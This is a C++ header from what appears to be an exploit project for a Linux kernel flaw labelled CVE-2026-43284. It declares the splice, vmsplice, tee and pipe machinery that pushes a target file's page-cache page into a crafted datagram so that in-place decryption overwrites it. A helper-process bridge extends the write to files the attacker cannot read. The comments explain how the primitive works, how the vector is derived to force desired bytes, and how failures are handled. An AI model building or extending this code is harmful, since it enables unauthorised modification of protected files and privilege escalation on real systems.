#pragma once
/** @file backend/cve_2026_43284/landing/real_splice_io.hpp
 *  The system side of the write as real calls, behind one replaceable surface.
 *
 *  The old tree kept the same landing, and this file keeps its shape: every call involved
 *  (pipe2/splice/vmsplice/sendmsg/pread/close) sits behind one replaceable interface, the device
 *  binding is real_splice_io(), and host tests bind a fake -- so the write body has no direct call
 *  dependency. On top of the surface, RealSpliceIo is the concrete SpliceOps the device uses: the
 *  two block sources, the pipe assembly, and the retry rules the old implementation measured.
 *
 *  The frame the concrete class sends is the whole datagram the write body assembled. The sixteen
 *  bytes of the ciphertext slot travel on the wire spliced from the target file at the write
 *  offset, not from the buffer -- that substitution is the primitive, because the kernel then
 *  decrypts in place over that page. So the page source is required: with no usable descriptor and
 *  no bound bridge there is no datagram, and a bridge that returns anything but a full block fails
 *  the block closed.
 *
 *  For a carrier this process cannot read, one helper run now serves both needs of a block: the
 *  helper splices the target page into a pipe, tee(2) copies sixteen bytes out of that pipe as the
 *  preimage, and the page stays in the pipe until the send moves it into the datagram's pipe. The
 *  page that lands is still the carrier's page cache page -- the tee only duplicates its bytes for
 *  the vector, never substitutes the buffer for the page -- and a block costs one helper run
 *  instead of two. A pending page whose offset does not match the block being sent, or a tee that
 *  fails or comes back short, fails that block closed: the frame's own bytes are never used as the
 *  page.
 *
 *  No path allocates: caller buffers and one descriptor pair are all it uses.
 */
#include <cstddef>
#include <cstdint>

#include "backend/cve_2026_43284/landing/pagecache_write.hpp"

namespace ghostlock::backend::cve_2026_43284::landing {
    /** Injected source for the sixteen bytes the vector is derived from. Unbound keeps the direct
     *  read through the surface; a carrier this process cannot read directly binds the bridge here,
     *  and the bridge is all-or-nothing: only a full block counts, and any other outcome fails the
     *  block closed rather than feed a wrong vector into a datagram. */
    struct OldPageSource final {
        void *ctx = nullptr;
        long (*read16)(void *ctx, std::uint64_t offset,
                       std::uint8_t out[kBlockBytes]) noexcept = nullptr;

        [[nodiscard]] bool available() const noexcept { return read16 != nullptr; }
    };

    /** Injected source for the ciphertext page when the target file cannot be opened at all. The
     *  real binding runs the helper with its output on the write pipe; the helper splices the page
     *  into that pipe itself. Only a full block counts; anything else fails the block closed. */
    struct HelperWriteSource final {
        void *ctx = nullptr;
        long (*splice16)(void *ctx, int pipe_write_fd,
                         std::uint64_t offset) noexcept = nullptr;

        [[nodiscard]] bool available() const noexcept { return splice16 != nullptr; }
    };

    /** The calls the write needs, as one replaceable surface. A surface is usable only when every
     *  entry point is bound; there is no separate ready flag, so a half-bound surface cannot
     *  advertise itself. */
    struct SpliceIoOps final {
        /** Create a pipe. Returns 0, or -errno. */
        int (*pipe2)(int fds[2], int flags) noexcept = nullptr;
        /** Move up to len bytes between descriptors; the offsets are inputs (null for a pipe end).
         *  Returns the moved count, or -errno. */
        long (*splice)(int fd_in, const std::uint64_t *off_in, int fd_out,
                       const std::uint64_t *off_out, std::size_t len,
                       unsigned flags) noexcept = nullptr;
        /** Map len bytes of caller memory into the pipe. Returns the mapped count, or -errno. */
        long (*vmsplice)(int fd, const std::uint8_t *data, std::size_t len,
                         unsigned flags) noexcept = nullptr;
        /** Send exactly one datagram on a connected socket. Returns len, or -errno. The splice path
         *  does not use this entry, but it stays part of the surface for the same reason as before:
         *  an incomplete surface must not read as usable. */
        long (*send_datagram)(int fd, const std::uint8_t *buf, std::size_t len) noexcept = nullptr;
        /** Read up to len bytes at an offset. Returns the count, 0 at end of file, or -errno. */
        long (*read_at)(int fd, std::uint8_t *out, std::size_t len,
                        std::uint64_t offset) noexcept = nullptr;
        /** close(2). Returns 0, or -errno. */
        int (*close_fd)(int fd) noexcept = nullptr;

        /** 桥的形态：这个面按哪种桥供页（0 = 每块 fork 一次，1 = 一次 fork 的常驻会话）。默认
         *  kBridgeModeDefault＝spawn，与今天逐字节一致。两处读它：RealSpliceIo 决定诊断探针的粒度
         *  （会话下一次读只值一次 IPC，所以每块都能做），PageCacheWrite 用它和门的取值对账。 */
        int bridge_mode = kBridgeModeDefault;

        /** 复制管道内容到另一条管道而不消费它（tee(2)）。返回复制的字节数，或 -errno。默认
         *  nullptr 表示这个面不能 tee：载体不可直读时保持原来的两次 helper 运行（read16 取
         *  preimage、splice16 送页），行为与没有这个入口时逐字节一致。 */
        long (*tee)(int fd_in, int fd_out, std::size_t len, unsigned flags) noexcept = nullptr;
        /** 从管道读（read(2)）：tee 复制出来的 preimage 从这里读回。默认 nullptr，语义同 tee。
         *  管道的偏移语义不适用，所以它不并进 read_at。 */
        long (*read_pipe)(int fd, std::uint8_t *out, std::size_t len) noexcept = nullptr;

        [[nodiscard]] bool available() const noexcept {
            return pipe2 != nullptr && splice != nullptr && vmsplice != nullptr &&
                   send_datagram != nullptr && read_at != nullptr && close_fd != nullptr;
        }
        /** tee 路径可用的判据：两个入口都绑定。少了任何一个都退回两次 helper 的运行。 */
        [[nodiscard]] bool tee_available() const noexcept {
            return tee != nullptr && read_pipe != nullptr;
        }
    };

    /** Device binding: the real calls on Linux; an all-null surface anywhere else, so the tree
     *  still links and available() stays false instead of a link error. */
    [[nodiscard]] SpliceIoOps real_splice_io() noexcept;

    /** The concrete system side: the surface plus the two block sources. */
    class RealSpliceIo final : public SpliceOps {
    public:
        RealSpliceIo(SpliceIoOps io, int file_fd, int pipe_flags = 0,
                     OldPageSource old_page = {}, HelperWriteSource helper = {}) noexcept
            : io_(io), file_fd_(file_fd), pipe_flags_(pipe_flags),
              old_page_(old_page), helper_(helper) {}

        RealSpliceIo(const RealSpliceIo &) = delete;
        RealSpliceIo &operator=(const RealSpliceIo &) = delete;
        /* TODO(2026-10-17：tee 路径会把目标页停在 pending_page_fd_ 里等 splice_one；析构必须把它
         * 还给内核（最多一条管道 + 一页的引用）。门禁全绿并由 Lead 确认后，下一行旧码与本注释一并
         * 删除。)
         * ~RealSpliceIo() noexcept override = default;
         */
        ~RealSpliceIo() noexcept override { drop_pending(); }

        /** The block at an offset: the direct read through the surface, retried on short transfers
         *  and on -EINTR; with no readable descriptor, the bound bridge -- one helper run whose page
         *  is teed for the preimage and kept pending for the next splice_one when the surface can
         *  tee, or the source's own read when it cannot.
         *  @return exactly @p size on success; a short count, or a negative -errno, otherwise. */
        [[nodiscard]] long read_at(int fd, std::uint8_t *out, std::size_t size,
                                   std::uint64_t offset) noexcept override;

        /** Send one datagram of @p size bytes: the in-memory bytes before the ciphertext slot, the
         *  page spliced from the target at @p offset (moved out of the pending pipe when read_at left
         *  one there, spliced by the helper otherwise), then the in-memory remainder (the check).
         *
         *  @note The helper path's "what would the same source read here" cross-check is a
         *        diagnostic, not part of the frame: it is sampled every 512 bytes, because doing it
         *        per block costs one extra helper fork+exec per block on a carrier this process
         *        cannot read. The page that is authenticated and that lands is still the one the
         *        helper splices into the pipe -- sampling the probe does not change where the page
         *        comes from.
         *  @return false when @p datagram is null, when the frame is too short to hold the page,
         *          when no page source can run, or when any step fails; then no datagram is sent. */
        [[nodiscard]] bool splice_one(int socket_fd, const std::uint8_t *datagram,
                                      std::size_t size, std::uint64_t offset) noexcept override;

        /** The vector, from the primitive that owns it. */
        void compute_iv(const std::uint8_t old_block[kBlockBytes],
                        const std::uint8_t desired_block[kBlockBytes],
                        const std::uint8_t key[32],
                        std::uint8_t out[kBlockBytes]) noexcept override;

        /** The check, from the primitive that owns it. */
        void compute_icv(const std::uint8_t *datagram, std::size_t size,
                         const std::uint8_t hmac_key[32], std::uint8_t icv_len,
                         std::uint8_t *out) noexcept override;

        /** A block can be served when there is a descriptor to splice from or a bridge that splices
         *  it: either one puts the carrier's page in the datagram. */
        [[nodiscard]] bool can_serve_page() const noexcept override {
            return file_fd_ >= 0 || helper_.available();
        }
        /** 这个面声明的桥形态（转自 SpliceIoOps 的同一个取值）。 */
        [[nodiscard]] int bridge_mode() const noexcept override { return io_.bridge_mode; }
        /** And read back when either the descriptor or the bridge can produce it -- the vector and
         *  the verification both read the carrier. */
        [[nodiscard]] bool can_read_page() const noexcept override {
            return file_fd_ >= 0 || old_page_.available();
        }

        /** 最近一次 splice_one 失败的码：0 无失败；正数是前置检查的序号（5 = pending 页的
         *  offset 与本次要发的块不符），负数是 -errno。 */
        [[nodiscard]] int last_error() const noexcept override { return last_error_; }

    private:
        /** 载体不可直读时的一整块来源：helper 把目标页切进一条管道，tee 复制十六字节当 preimage，
         *  页留在管道里等 splice_one。任何一步不满十六字节都关掉已开的管道，不留 pending 页。
         *  @param out    接收十六字节 preimage 的调用方缓冲。
         *  @param offset 目标页在载体里的偏移，原样交给 helper。
         *  @return 十六字节；短读或失败时是短计数或 -errno。 */
        [[nodiscard]] long read_page_via_helper(std::uint8_t *out, std::uint64_t offset) noexcept;

        /** 把页管道里的十六字节 tee 一份到另一条管道读成 preimage；源管道与其中的页不动。
         *  @return 十六字节，或短计数 / -errno；失败时页管道仍由调用方关闭。 */
        [[nodiscard]] long teed_preimage(int page_fd, std::uint8_t *out,
                                         std::uint64_t offset) noexcept;

        /** 从管道读满一块：-EINTR 重试，EOF 按已读计数返回。 */
        [[nodiscard]] long read_all_pipe(int fd, std::uint8_t *out) noexcept;

        /** 把 pending 页从它的管道移进 @p out_fd：只转移管道缓冲，页仍是载体 page cache 的那一页。 */
        [[nodiscard]] long splice_pending_page(int out_fd) noexcept;

        /** 关掉并清空 pending 页槽：送出成功、失败、offset 不符、析构都走这一条。 */
        void drop_pending() noexcept;

        SpliceIoOps io_;
        int file_fd_ = -1;
        int last_error_ = 0;
        int pipe_flags_ = 0;
        /** read_at 切进管道、等 splice_one 送出的目标页管道读端（-1 = 没有）。 */
        int pending_page_fd_ = -1;
        /** 那一页在载体里的偏移；splice_one 的 offset 必须与它相等才允许使用。 */
        std::uint64_t pending_offset_ = 0U;
        /** tee 路径走过的块数，只用于日志的 256 块节流。 */
        std::size_t tee_blocks_ = 0U;
        OldPageSource old_page_{};
        HelperWriteSource helper_{};
    };
}  // namespace ghostlock::backend::cve_2026_43284::landing
